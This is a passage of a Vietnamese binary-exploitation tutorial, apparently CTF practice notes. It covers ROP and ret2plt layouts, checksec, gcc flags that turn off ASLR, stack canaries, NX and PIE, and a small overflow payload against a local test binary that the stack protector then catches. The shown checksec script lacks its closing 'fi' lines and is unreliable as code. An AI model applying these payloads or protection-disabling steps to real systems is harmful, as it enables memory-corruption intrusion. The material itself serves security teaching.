+    Đẩy các giá trị cần thiết vào các thanh ghi
+        pop eax
+        pop ebx
+        pop ecx
+        ret         #ret to int 0x80
+    
+ret2text
+    jumping into the .text section (code section) of the executable binary itself. ret2plt and ret2dlresolve are two specific examples of it.
+
+ret2plt
+    ↑ Lower addresses
+        &strcpy@plt       4 bytes       Address of strcpy’s PLT entry
+        dest_ret          4 bytes       Where to go after strcpy()
+        dest              4 bytes       A known writable and executable location
+        src               4 bytes       Must point to injected code
+    ↓ Higher addresses
+    
+ret2dl-resolve
+...
+Nhiều vl (@@)!
+
+    -----------(   0x05 Checksec )------------------
+"Checksex" là cách kiểm tra giới tính :P
+
+Bạn có thể checksec bằng gdb-peda 
+    felix@ubuntu:~/over$ gdb ./over1
+    gdb-peda$ checksec
+    CANARY    : disabled
+    FORTIFY   : disabled
+    NX        : disabled
+    PIE       : disabled
+    RELRO     : Partial
+
+Naò mình cùng giải thích các thuật ngữ:
+ASLR    : configure ASLR in Linux using the /proc/sys/kernel/randomize_va_space interface.
+            0 - No randomization. Everything is static.
+            1 - Conservative randomization. Shared libraries, stack, mmap(), VDSO and heap are randomized.
+            2 - Full randomization. In addition to elements listed in the previous point, memory managed through brk() is also randomized.
+CANARY  : kiểm tra xem canary có bật không
+FORTIFY : Trình biên dịch sẽ thay thế các chức năng không an toàn trong khi chương trình được thực thi. Điều này được gọi Fortify SOURCE.  
+          (tham khảo http://tk-blog.blogspot.com/2011/01/checksecsh-now-with-fortifysource.html)
+NX      : kiểm tra chức năng non-excute stack
+PIE     : nếu PIE được bật thì nó sẽ aslr cả phần .text (code) của chương trình
+          bình thường nếu aslr (/proc/sys/kernel/randomize_va_space) được bật nó sẽ không random .text
+RELRO   : bảo vệ các phân vùng, tránh overwrite  .ctors, .dtors, .jcr, .dynamic and .got.   
+          Partial RELRO
+              compiler command line: gcc -Wl,-z,relro
+              the ELF sections are reordered so that the ELF internal data sections (.got, .dtors, etc.) precede the program's data sections (.data and .bss)
+              non-PLT GOT is read-only
+              GOT is still writeable
+          Full RELRO
+              compiler command line: gcc -Wl,-z,relro,-z,now
+              supports all the features of partial RELRO
+              bonus: the entire GOT is also (re)mapped as read-only 
+
+Ngoài ra bạn có thể download file checksec ở đường dẫn sau:
+    https://github.com/slimm609/checksec.sh/blob/master/checksec
+    và run
+    root@kali:~/ctf/over# checksec ./over1
+    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY Fortified Fortifiable  FILE
+    Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No      0               4       ./over1    
+    
+Mở file checksec ra kiểm tra thử:
+OMG! cũng ko có gì khó cả, script chỉ sử dụng câu lệnh readelf có sẵn của linux:
+    Display Dynamic Relocation Entries objdump -R YOUR_BINARY
+    Show Program Header Table readelf -l YOUR_BINARY
+    Show Section Header Table readelf -S YOUR_BINARY
+    Display Relocations readelf -r YOUR_BINARY 
+    
+--------------------checksec---------------------------
+#RELRO 
+if $readelf -l  ./file_vuln  2>/dev/null | grep 'GNU_RELRO'; then
+    if $readelf -d  ./file_vuln  2>/dev/null | grep 'BIND_NOW'; then
+        echo 'Full RELRO'
+    else
+        echo 'Partial RELRO'
+else
+    echo 'No RELRO'
+
+#stack canary
+if $readelf -s  ./file_vuln  2>/dev/null | grep '__stack_chk_fail'; then
+    echo 'Canary found'
+else
+    echo 'No canary found'
+
+#NX 
+if $readelf -W -l  ./file_vuln  2>/dev/null | grep 'GNU_STACK' | grep 'RWE'; then
+    echo 'NX disabled'
+else
+    echo 'NX enabled'
+ 
+#PIE 
+if $readelf -h  ./file_vuln  2>/dev/null | grep 'Type:[[:space:]]*EXEC'; then
+    echo 'No PIE'
+elif $readelf -h  ./file_vuln  2>/dev/null | grep 'Type:[[:space:]]*DYN'; then
+    if $readelf -d  ./file_vuln  2>/dev/null | grep '(DEBUG)'; then
+        echo 'PIE enabled '
+    else   
+        echo 'DSO'
+else
+  echo 'Not an ELF'
+
+    
+    -----------(   0x06 Tùy chọn khi biên dịch trong gcc )-----------------
+    
+Disable aslr:
+    felix@ubuntu:~/over$ su
+    Password: ******
+    root@ubuntu:/home/felix/over# echo 0 > /proc/sys/kernel/randomize_va_space
+    root@ubuntu:/home/felix/over# cat /proc/sys/kernel/randomize_va_space
+    0       #bằng 0 là ok nha
+    root@ubuntu:/home/felix/over# exit
+    
+Disable canary:
+    gcc vuln.c -o vuln_disable_all -fno-stack-protector
+
+Disable DEP:
+    gcc vuln.c -o vuln_disable_all -z execstack
+
+Disable PIE:
+    gcc vuln.c -o vuln_disable_all -no-pie
+
+Disable all of protection mechanisms listed above (warning: for local testing only):
+    gcc vuln.c -o vuln_disable_all -fno-stack-protector -z execstack -no-pie
+
+--------------Trở lại với ví dụ over1 :) . 
+Ta biên dịch với option -fstack-protector-all 
+    Tùy chọn -fstack-protector-all sẽ thực hiện canary và Ideal Stack Layout cho mọi hàm
+    Tùy chọn -fstack-protector chỉ tác động đến những hàm mà đặt vào stack mảng kí tự kích thước lớn hơn 8MB. Tùy chọn này cho phép bảo vệ hầu hết những khu vực nguy hiểm.
+    Tùy chọn -fstack-protector-strong cho phép bảo vệ những vùng được bảo vệ bởi tùy chọn -fstack-protector, ngoài ra còn bảo vệ tất cả các mảng cục bộ và một số vùng nguy hiểm khác. Tùy chọn này bao quát khoảng 20% số hàm của nhân, tức là một chỉ số tốt so với 2% được bao quát bởi tùy chọn -fstack-protector.
+    
+Trong tut1 ta biên dịch với tùy chọn -fno-stack-protector còn trong ví dụ này ta biên dịch:
+    root@kali:~/ctf/over# gcc -fstack-protector-all -no-pie -o over1 over1.c 
+Ta sử dụng lại mã khai thác over1
+    root@kali:~/ctf/over# python -c 'print "a"*32 + "\x01"' | ./over1
+    buffer : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  (0xbffff67c) 
+    i = 0 (0xbffff678)
+    *** stack smashing detected ***: ./over1 terminated
+    
+FCK không được rồi, ta sẽ thử tìm hiểu thử xem
+    root@kali:~/ctf/over# python -c 'print "a"*32 + "\x01"' > /tmp/1
+    root@kali:~/ctf/over# gdb ./over1
+        gdb-peda$ checksec
+        CANARY    : ENABLED
+        FORTIFY   : disabled
+        NX        : ENABLED
+        PIE       : disabled
+        RELRO     : Partial
+    OMG!
+    gdb-peda$ pdisas main
+    .....snip....
+           0x08048569 <+158>:   mov    ecx,DWORD PTR [ebp-0xc]
+           0x0804856c <+161>:   xor    ecx,DWORD PTR gs:0x14
+           0x08048573 <+168>:   je     0x804857a <main+175>
+           0x08048575 <+170>:   call   0x8048600 <__stack_chk_fail_local>
+           0x0804857a <+175>:   lea    esp,[ebp-0x8]
+    ......
+    Đoạn assem trên chính là để check canary
+    Ta để ý tiếp đoạn
+           0x0804854a <+127>:   mov    eax,DWORD PTR [ebp-0x30]
+           0x0804854d <+130>:   cmp    eax,0x1
+    Đây là đoạn code so sánh i với 1
+    Địa chỉ $ebp-0x30 là địa chỉ của biến i
+    Ta đặt breakpoint tại đây
+        gdb-peda$ b * 0x0804854a     
+    Lại chạy chương trình với đầu vào là file /tmp/1
+        gdb-peda$ r < /tmp/1
+        gdb-peda$ x/30wx $ebp-0x30
+        0xbffff678:     0x00000000      0x61616161      0x61616161      0x61616161
+        0xbffff688:     0x61616161      0x61616161      0x61616161      0x61616161
+        0xbffff698:     0x61616161      0xde540001      0xbffff6c0      0x00000000
+        0xbffff6a8:     0x00000000      0xb7e14276      0x00000001      0xb7faf000
+        0xbffff6b8:     0x00000000      0xb7e14276      0x00000001      0xbffff754
+        0xbffff6c8:     0xbffff75c      0x00000000      0x00000000      0x00000000
+        0xbffff6d8:     0xb7faf000      0xb7fffc04      0xb7fff000      0x00000000
+        0xbffff6e8:     0x00000001      0xb7faf000
+
+    => Địa chỉ của biến i ở đây là 0xbffff678
+    Vậy ta đã thấy rõ ở đây Ideal Stack Layout (Ngăn xếp lý tưởng => sắp xếp lại stack)'
+   
+   Với tut1 ta biên dịch với tùy chọn -fno-stack-protector thì mô hình ngăn xếp:    
+        hign
+            |-----------------------|
+            |        arg main       |    
+            |-----------------------|
+            |        ret main       |
+            |-----------------------|
+            |        ebp main       |
+            |-----------------------|
+            |        i (4 byte)     |
+            |-----------------------|       
+            |                       |
+            |                       |
+            |                       |
+            |        buffer         |
+            |       (32  byte)      |
+            |                       |
+            |                       |
+            |-----------------------|
+        low   
+    Đoạn so sánh i=1
+       0x080484d2 <+103>:   mov    eax,DWORD PTR [ebp-0xc]
+       0x080484d5 <+106>:   cmp    eax,0x1
+       
+       
+       
+    Vơi tùy chọn bảo vệ -fstack-protector-all thì mô hình ngăn xếp :
+        hign
+            |-----------------------|
+            |        arg main       |    
+            |-----------------------|
+            |        ret main       |
+            |-----------------------|
+            |        ebp main       |
+            |-----------------------|
+            |        canary         |
+            |-----------------------|       
+            |                       |
+            |                       |
+            |                       |
+            |        buffer         |
+            |       (32  byte)      |
+            |                       |
+            |                       |
+            |-----------------------|
+            |       i (4 byte)      |
+            |-----------------------|       
+        low   
+    Đoạn so sánh i=1
+        0x0804854a <+127>:   mov    eax,DWORD PTR [ebp-0x30]
+        0x0804854d <+130>:   cmp    eax,0x1
+Bạn để ý vị trí của i : [ebp-0x30] và  [ebp-0xc]   (BINGO)
+    
+Đến đây bạn có thể thấy rõ qua về cơ chế bảo vệ canary và  Ideal Stack Layout      
+Với các cơ chế khác, bạn có thể tự chạy để kiểm chứng.
+Mệt vãi => Chúc mừng năm mới.
+
+--------[ EOF
